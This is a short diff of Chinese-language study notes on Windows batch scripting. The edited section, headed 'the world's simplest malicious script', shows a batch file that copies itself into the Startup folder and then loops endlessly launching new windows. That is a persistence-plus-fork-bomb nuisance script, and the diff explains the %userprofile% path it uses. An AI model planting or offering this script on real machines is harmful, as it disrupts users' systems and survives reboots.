@@ -20,7 +20,8 @@ cmdcmdcmdcmd
 ":"一般配合"goto"使用，如果单独使用没有任何意义。
 
 世界上最简单的恶意脚本
-copy filename.bat C:\Users\felipew\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup //可以在win+r中输入"shell:startup"找到。
+copy filename.bat "%userprofile%\Start Menu\Programs\Startup" 
+//此路径可以在win+r中输入"shell:startup"找到。"%%"在windows里代表取值(通常用作去一个变量的值), "userprofile"是由微软系统定义的变量。双引号的作用是防止空格或者双引号被系统误解读取。
 :d
 start
 go to d
